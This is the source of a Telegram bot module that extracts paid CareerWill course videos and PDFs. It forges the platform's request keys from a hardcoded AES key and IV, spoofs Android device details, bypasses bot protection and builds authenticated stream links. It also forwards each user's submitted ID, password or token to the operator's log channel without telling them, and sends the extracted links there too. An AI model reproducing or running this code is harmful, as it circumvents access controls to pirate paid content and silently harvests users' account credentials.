import os
import re
import base64
import datetime
import requests
import threading
import asyncio
import cloudscraper
import time
from pyromod import listen
from pyrogram import Client
from pyrogram import filters
from pyrogram.types import Message
from config import CHANNEL_ID, CHANNEL_ID2, THUMB_URL, TXT_LOGO_URL, BOT_TEXT
from Extractor import app
from Extractor.core.utils import forward_to_log, send_to_log

requests = cloudscraper.create_scraper()
ACCOUNT_ID = "6206459123001"
bc_url = f"https://edge.api.brightcove.com/playback/v1/accounts/{ACCOUNT_ID}/videos/"

# Helper to generate CareerWill encrypted cwkey
def generate_cwkey():
    try:
        from Crypto.Cipher import AES
        key = b'E12K7l97Z7wCo3Gu'
        iv = b'mOk15J2m12qZ2tKI'
        msg = f"{int(time.time()*1000)}||crwillweb@4598".encode('utf-8')
        pad = 16 - (len(msg) % 16)
        msg += bytes([pad] * pad)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = cipher.encrypt(msg)
        return base64.b64encode(enc).decode('utf-8')
    except Exception:
        return "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy"

# Robust API requester that tries web, v10, v9 and handles errors safely
def cw_get_json(path_suffix, token, headers_extra=None, timeout=12):
    endpoints = [
        ("https://elearn.crwilladmin.com/api/v10/" + path_suffix, {
            "Host": "elearn.crwilladmin.com",
            "appver": "240",
            "apptype": "android",
            "usertype": "2",
            "token": token,
            "cwkey": generate_cwkey(),
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "okhttp/5.0.0-alpha.2"
        }),
        ("https://wbspec.crwilladmin.com/api/v1/" + path_suffix, {
            "token": token,
            "cwkey": generate_cwkey(),
            "apptype": "web",
            "appver": "1",
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "origin": "https://web.careerwill.com",
            "referer": "https://web.careerwill.com/"
        }),
        ("https://elearn.crwilladmin.com/api/v9/" + path_suffix, {
            "Host": "elearn.crwilladmin.com",
            "appver": "107",
            "apptype": "android",
            "usertype": "2",
            "token": token,
            "cwkey": "+HwN3zs4tPU0p8BpOG5ZlXIU6MaWQmnMHXMJLLFcJ5m4kWqLXGLpsp8+2ydtILXy",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "okhttp/5.0.0-alpha.2"
        })
    ]

    for url, base_headers in endpoints:
        try:
            if headers_extra:
                base_headers.update(headers_extra)
            resp = requests.get(url, headers=base_headers, timeout=timeout)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict) and ("data" in data or "responseCode" in data):
                        return data
                except Exception:
                    continue
        except Exception:
            continue
    return None

# Fetch batches supporting both CareerWill Web SSR and mobile APIs
def get_careerwill_batches(token):
    # 1. Try CareerWill Web Next.js data endpoint
    try:
        home_res = requests.get('https://web.careerwill.com/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, timeout=8)
        build_match = re.search(r'"buildId":"([^"]+)"', home_res.text)
        if build_match:
            build_id = build_match.group(1)
            all_batches = []
            is_redirect_login = False
            for iface in [1, 2, 3, 4]:
                url = f"https://web.careerwill.com/_next/data/{build_id}/live-classes.json?batch_type=my"
                r = requests.get(url, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Cookie': f'token={token}; interface={iface}'
                }, timeout=8)
                if r.status_code == 200:
                    try:
                        d = r.json()
                        page_props = d.get('pageProps', {})
                        if page_props.get('__N_REDIRECT') == '/login' or '/login' in str(page_props.get('__N_REDIRECT', '')):
                            is_redirect_login = True
                        m_batches = page_props.get('myBatchData', [])
                        for b in m_batches:
                            if not any(x.get('id') == b.get('id') for x in all_batches):
                                all_batches.append(b)
                    except Exception:
                        pass
            if all_batches:
                return all_batches, "OK", build_id
            if is_redirect_login:
                return None, "EXPIRED", build_id
    except Exception:
        pass

    # 2. Try Mobile API endpoints
    resp_data = cw_get_json("my-batch", token)
    if resp_data and isinstance(resp_data, dict):
        batch_list = resp_data.get("data", {}).get("batchData", [])
        if batch_list:
            return batch_list, "OK", None
        if resp_data.get("responseCode") in [401, 403]:
            return None, "EXPIRED", None

    return [], "EMPTY", None

# Download thumbnail
def download_thumbnail(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            thumb_path = "thumb_temp.jpg"
            with open(thumb_path, "wb") as f:
                f.write(response.content)
            return thumb_path
        return None
    except Exception:
        return None

# -------------------- Downloader Function with Live Updates ---------------------
async def careerdl(app, message, headers, raw_text2, token, raw_text3, prog, name, today_only=False):
    num_id = [x.strip() for x in raw_text3.split('&') if x.strip()]
    result_text = ""
    total_videos = 0
    total_notes = 0
    total_topics = len(num_id)
    current_topic = 0
    start_time = time.time()
    last_update_time = 0

    # Download thumbnail at start
    thumb_path = download_thumbnail(THUMB_URL)

    # Helper function for live progress update
    async def update_live_progress(status_text, current_item_name, topic_name, force=False):
        nonlocal last_update_time
        now = time.time()
        if not force and (now - last_update_time < 2.0):
            return
        last_update_time = now

        elapsed = now - start_time
        elapsed_str = f"{int(elapsed//60)}m {int(elapsed%60)}s"

        progress_msg = (
            "⚡ <b>CareerWill Live Extraction</b>\n\n"
            f"📚 <b>Subject/Topic:</b> <code>{topic_name}</code> ({current_topic}/{total_topics})\n"
            f"🎯 <b>Status:</b> {status_text}\n"
            f"🎬 <b>Current Item:</b> <code>{current_item_name[:40]}</code>\n\n"
            f"📊 <b>Progress Stats:</b>\n"
            f"├─ 🎬 Videos Extracted: <b>{total_videos}</b>\n"
            f"├─ 📄 PDFs Extracted: <b>{total_notes}</b>\n"
            f"├─ 📦 Total Links: <b>{total_videos + total_notes}</b>\n"
            f"└─ ⏱ Elapsed Time: {elapsed_str}"
        )
        try:
            await prog.edit_text(progress_msg)
        except Exception:
            pass

    # Pre-fetch topics map once
    topic_map = {}
    topic_resp = cw_get_json(f"batch-topic/{raw_text2}?type=class", token)
    if topic_resp and "data" in topic_resp:
        for t in topic_resp["data"].get("batch_topic", []):
            topic_map[str(t.get("id"))] = t.get("topicName", "Unknown Topic")

    for id_text in num_id:
        try:
            current_topic += 1
            current_topic_name = topic_map.get(id_text, f"Topic {id_text}")

            await update_live_progress("Fetching topic classes...", current_topic_name, current_topic_name, force=True)

            data = cw_get_json(f"batch-detail/{raw_text2}?topicId={id_text}", token)
            classes = []
            if data and "data" in data and "class_list" in data["data"]:
                classes = data["data"]["class_list"].get("classes", [])
                classes.reverse()

            for video_data in classes:
                vid_id = video_data.get('id')
                lesson_name = video_data.get('lessonName', 'Class Video')
                lesson_ext = video_data.get('lessonExt', '')

                await update_live_progress("Extracting Class", lesson_name, current_topic_name)

                detail_data = cw_get_json(f"class-detail/{vid_id}", token)
                lesson_url = None
                if detail_data and "data" in detail_data and "class_detail" in detail_data["data"]:
                    lesson_url = detail_data["data"]["class_detail"].get("lessonUrl")

                if not lesson_url:
                    lesson_url = video_data.get('lessonUrl', '')

                if not lesson_url:
                    continue

                if lesson_ext == 'brightcove':
                    video_link = f"{bc_url}{lesson_url}/master.m3u8?bcov_auth={token}"
                    total_videos += 1
                elif lesson_ext == 'youtube':
                    video_link = f"https://www.youtube.com/embed/{lesson_url}"
                    total_videos += 1
                elif lesson_url.startswith("http"):
                    video_link = lesson_url
                    total_videos += 1
                else:
                    video_link = f"{bc_url}{lesson_url}/master.m3u8?bcov_auth={token}"
                    total_videos += 1

                result_text += f"{lesson_name}: {video_link}\n"

            # Notes extraction
            await update_live_progress("Fetching study notes & PDFs...", current_topic_name, current_topic_name)
            notes_resp = cw_get_json(f"batch-notes/{raw_text2}?topicId={id_text}", token)
            if notes_resp and 'data' in notes_resp:
                for note in reversed(notes_resp['data'].get('notesDetails', [])):
                    doc_title = note.get('docTitle', 'Study Note')
                    doc_url = note.get('docUrl', '').replace(' ', '%20')
                    if doc_url:
                        line = f"{doc_title}: {doc_url}\n"
                        if line not in result_text:
                            result_text += line
                            total_notes += 1
                            await update_live_progress("Extracting PDF Note", doc_title, current_topic_name)

        except Exception as e:
            print(f"Error processing CareerWill topic {id_text}: {e}")

    # General batch-wide notes if any
    try:
        gen_notes = cw_get_json(f"batch-topic/{raw_text2}?type=notes", token)
        if gen_notes and 'data' in gen_notes:
            for topic in gen_notes['data'].get('batch_topic', []):
                t_id = topic.get('id')
                if str(t_id) not in num_id:
                    notes_data = cw_get_json(f"batch-notes/{raw_text2}?topicId={t_id}", token)
                    if notes_data and 'data' in notes_data:
                        for note in reversed(notes_data['data'].get('notesDetails', [])):
                            doc_title = note.get('docTitle', 'Batch Note')
                            doc_url = note.get('docUrl', '').replace(' ', '%20')
                            if doc_url:
                                line = f"{doc_title}: {doc_url}\n"
                                if line not in result_text:
                                    result_text += line
                                    total_notes += 1
    except Exception:
        pass

    if today_only and result_text:
        import pytz
        today_ist = datetime.datetime.now(pytz.timezone('Asia/Kolkata')).date()
        t_patterns = [
            today_ist.strftime('%d-%m-%Y'),
            today_ist.strftime('%d/%m/%Y'),
            today_ist.strftime('%Y-%m-%d'),
            today_ist.strftime('%d %b %Y'),
            today_ist.strftime('%d %B %Y')
        ]
        filtered_lines = [line for line in result_text.splitlines() if any(p in line for p in t_patterns)]
        result_text = '\n'.join(filtered_lines) + ('\n' if filtered_lines else '')

    if not result_text.strip():
        try:
            await prog.delete()
        except Exception:
            pass
        if thumb_path and os.path.exists(thumb_path):
            try:
                os.remove(thumb_path)
            except Exception:
                pass
        if today_only:
            await message.reply("❌ **आज इस बैच में कोई भी क्लास नहीं हुई है या आज का कोई लिंक उपलब्ध नहीं है।**")
        else:
            await message.reply("❌ <b>No content found in this batch.</b>")
        return

    file_name = f"{name.replace('/', '').replace(':', '')}.txt"
    logo_header = f"IMAGE: {TXT_LOGO_URL}\n\n"
    with open(file_name, 'w', encoding='utf-8') as f:
        f.write(logo_header + result_text)

    current_date = datetime.datetime.now().strftime("%Y-%m-%d")

    caption = (
        "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
        "📱 <b>APP:</b> CareerWill\n"
        f"📚 <b>BATCH:</b> {name}\n"
        f"📅 <b>DATE:</b> {current_date} IST\n\n"
        "📊 <b>CONTENT STATS</b>\n"
        f"├─ 🎬 Videos: {total_videos}\n"
        f"├─ 📄 PDFs/Notes: {total_notes}\n"
        f"└─ 📦 Total Links: {total_videos + total_notes}\n\n"
        f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
        f"<code>╾───• {BOT_TEXT} •───╼</code>"
    )

    doc_thumb = thumb_path if (thumb_path and os.path.exists(thumb_path)) else ("Extractor/thumbs/txt-5.jpg" if os.path.exists("Extractor/thumbs/txt-5.jpg") else None)

    try:
        await app.send_document(
            message.chat.id,
            document=file_name,
            caption=caption,
            thumb=doc_thumb
        )
        try:
            await send_to_log(
                document=file_name,
                caption=caption,
                thumb=doc_thumb
            )
        except Exception as log_err:
            print(f"Error sending careerwill doc to log: {log_err}")
    finally:
        try:
            await prog.delete()
        except Exception:
            pass
        if os.path.exists(file_name):
            try:
                os.remove(file_name)
            except Exception:
                pass
        if thumb_path and os.path.exists(thumb_path):
            try:
                os.remove(thumb_path)
            except Exception:
                pass

# -------------------- Main Command Handler ---------------------
@app.on_message(filters.command("ugcw") & filters.private)
async def career_will(app: Client, message: Message):
    try:
        welcome_msg = (
            "🔹 <b>CAREERWILL EXTRACTOR</b> 🔹\n\n"
            "Send <b>ID & Password</b> in this format: <code>ID*Password</code>\n\n"
            "<b>Or send Token directly:</b>\n"
            "- Token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code>"
        )
        input1 = await app.ask(message.chat.id, welcome_msg)
        await forward_to_log(input1, "Careerwill Extractor")
        raw_text = input1.text.strip()

        token = None

        if "*" in raw_text:
            email, password = raw_text.split("*", 1)
            email = email.strip()
            password = password.strip()

            headers = {
                "Host": "elearn.crwilladmin.com",
                "appver": "240",
                "apptype": "android",
                "cwkey": generate_cwkey(),
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
            data = {
                "deviceType": "android",
                "password": password,
                "deviceModel": "Xiaomi M2007J20CI",
                "deviceVersion": "Q(Android 10.0)",
                "email": email,
                "deviceIMEI": "d57adbd8a7b8u9i9",
                "deviceToken": "fake_device_token"
            }

            login_success = False
            for endpoint in ["https://elearn.crwilladmin.com/api/v10/login-other", "https://elearn.crwilladmin.com/api/v9/login-other"]:
                try:
                    resp = requests.post(endpoint, headers=headers, json=data, timeout=10)
                    if resp.status_code == 200:
                        res_json = resp.json()
                        token = res_json.get("data", {}).get("token")
                        if token:
                            login_success = True
                            break
                except Exception:
                    pass

            if not login_success or not token:
                await message.reply_text("❌ **Login Failed!**\nPlease check your email/mobile and password, or provide a direct session Token.")
                return

            success_msg = (
                "✅ <b>CareerWill Login Successful</b>\n\n"
                f"🆔 <b>Credentials:</b> <code>{email}*{password}</code>"
            )
            await message.reply_text(success_msg)
        else:
            # Extract clean JWT token using regex to eliminate any prefix like 'Token:' or channel suffix '@ASMultiverseAppZ'
            jwt_match = re.search(r'(eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+)', raw_text)
            if jwt_match:
                token = jwt_match.group(1)
            else:
                token = raw_text.replace("Token:", "").replace("token:", "").strip()
                if "@" in token:
                    token = token.split("@")[0].strip()

        if not token:
            await message.reply_text("❌ **Invalid Token provided.** Please send a valid CareerWill token.")
            return

        loading_msg = await message.reply_text("🔍 **Fetching CareerWill Batches... Please wait...**")

        # Fetch Batches safely
        batches, status, build_id = get_careerwill_batches(token)

        try:
            await loading_msg.delete()
        except Exception:
            pass

        if status == "EXPIRED":
            await message.reply_text(
                "❌ <b>Session Expired / Unauthorized!</b>\n\n"
                "Your CareerWill session token has expired or is invalid.\n"
                "Please log in again to CareerWill and send a fresh token."
            )
            return

        if not batches:
            await message.reply_text(
                "❌ <b>No Purchased Batches Found!</b>\n\n"
                "We could not find any active/purchased batches in this account.\n"
                "Please verify that this account has purchased courses."
            )
            return

        msg = "📚 <b>Available Batches</b>\n\n"
        for b in batches:
            batch_id = b.get('id')
            b_name = b.get('batchName', 'Unknown Batch')
            msg += f"<code>{batch_id}</code> - <b>{b_name}</b>\n"

        await message.reply_text(msg)
        input2 = await app.ask(message.chat.id, "<b>Send the Batch ID to download:</b>")
        raw_text2 = input2.text.strip()

        # Fetch Topics safely
        topic_data = cw_get_json(f"batch-topic/{raw_text2}?type=class", token)
        topics = []
        batch_name = f"Batch_{raw_text2}"
        if topic_data and "data" in topic_data:
            topics = topic_data["data"].get("batch_topic", [])
            batch_detail = topic_data["data"].get("batch_detail", {})
            if isinstance(batch_detail, dict) and "name" in batch_detail:
                batch_name = batch_detail["name"]

        if not topics:
            # Fallback batch name from batches list
            for b in batches:
                if str(b.get('id')) == raw_text2:
                    batch_name = b.get('batchName', batch_name)
                    break
            topics = [{"id": "0", "topicName": "All Lectures / Classes"}]

        id_list = ""
        topic_list = "📑 <b>Available Topics</b>\n\n"
        for topic in topics:
            t_id = topic.get('id')
            t_name = topic.get('topicName', 'Topic')
            topic_list += f"<code>{t_id}</code> - <b>{t_name}</b>\n"
            id_list += f"{t_id}&"

        await message.reply_text(topic_list)
        input3 = await app.ask(message.chat.id, 
            "📝 <b>Send topic IDs to download</b>\n\n"
            f"Format: <code>1&2&3</code>\n"
            f"All Topics: <code>{id_list}</code>"
        )
        raw_text3 = input3.text.strip()

        opt_input = await app.ask(
            message.chat.id,
            "**Choose extraction type:**\n\n"
            "1️⃣ 1 — 📦 **Full Batch**\n"
            "2️⃣ 2 — 📅 **Today's Class**"
        )
        today_only = (opt_input.text.strip() == "2")
        try:
            await opt_input.delete()
        except Exception:
            pass

        prog = await message.reply(
            "🔄 <b>Starting Live Extraction...</b>\n\n"
            "├─ Initializing modules...\n"
            "└─ Please wait..."
        )
        threading.Thread(target=lambda: asyncio.run(careerdl(app, message, None, raw_text2, token, raw_text3, prog, batch_name, today_only=today_only))).start()

    except Exception as e:
        error_msg = (
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )
        await message.reply(error_msg)



